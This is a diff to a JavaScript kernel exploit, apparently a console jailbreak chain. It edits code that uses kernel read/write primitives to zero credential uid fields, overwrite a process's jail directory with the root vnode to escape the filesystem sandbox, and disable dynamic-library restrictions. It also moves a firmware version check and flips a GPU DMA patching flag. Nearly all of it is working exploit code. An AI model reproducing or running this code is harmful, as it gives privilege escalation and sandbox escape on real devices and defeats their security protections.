@@ -119,6 +119,12 @@
         let saved_fpu_ctrl = 0;
         let saved_mxcsr = 0;
 
+        function compare_version(a, b) {
+            const [amaj, amin] = a.split('.').map(Number);
+            const [bmaj, bmin] = b.split('.').map(Number);
+            return amaj === bmaj ? amin - bmin : amaj - bmaj;
+        }
+
         function wait_for(addr, threshold) {
             while (read64(addr) !== threshold) {
                 nanosleep(1);
@@ -1572,17 +1578,6 @@
                 kernel.write_qword(proc_fd + 0x18n, rootvnode); // fd_jdir
             }
 
-            function patch_dynlib_restriction(proc) {
-                const dynlib_obj_addr = kernel.read_qword(proc + 0x3e8n);
-
-                kernel.write_dword(dynlib_obj_addr + 0x118n, 0n); // prot (todo: recheck)
-                kernel.write_qword(dynlib_obj_addr + 0x18n, 1n); // libkernel ref
-
-                // bypass libkernel address range check (credit @cheburek3000)
-                kernel.write_qword(dynlib_obj_addr + 0xf0n, 0n); // libkernel start addr
-                kernel.write_qword(dynlib_obj_addr + 0xf8n, 0xffffffffffffffffn); // libkernel end addr
-            }
-
             function patch_ucred(ucred, authid) {
                 kernel.write_dword(ucred + 0x04n, 0n); // cr_uid
                 kernel.write_dword(ucred + 0x08n, 0n); // cr_ruid
@@ -1613,7 +1608,6 @@
                 await log("patching curproc " + toHex(proc) + " (authid = " + toHex(authid) + ")");
 
                 patch_ucred(ucred, authid);
-                patch_dynlib_restriction(proc);
                 escape_filesystem_sandbox(proc);
 
                 const uid_after = Number(syscall(SYSCALL.getuid));
@@ -1674,7 +1668,7 @@
             // init GPU DMA for kernel r/w on protected area
             await gpu.setup();
 
-            const force_kdata_patch_with_gpu = true;
+            const force_kdata_patch_with_gpu = false;
             const fw_version_num = Number(FW_VERSION);
 
             if (fw_version_num >= 7 || force_kdata_patch_with_gpu) {
@@ -1801,12 +1795,6 @@
         send_notification(lapse_version);
         
         await log("Detected firmware : " + FW_VERSION);
-
-        function compare_version(a, b) {
-            const [amaj, amin] = a.split('.').map(Number);
-            const [bmaj, bmin] = b.split('.').map(Number);
-            return amaj === bmaj ? amin - bmin : amaj - bmaj;
-        }
         
         if (compare_version(FW_VERSION, "10.01") > 0) {
             await log("Not suppoerted firmware\nAborting...");
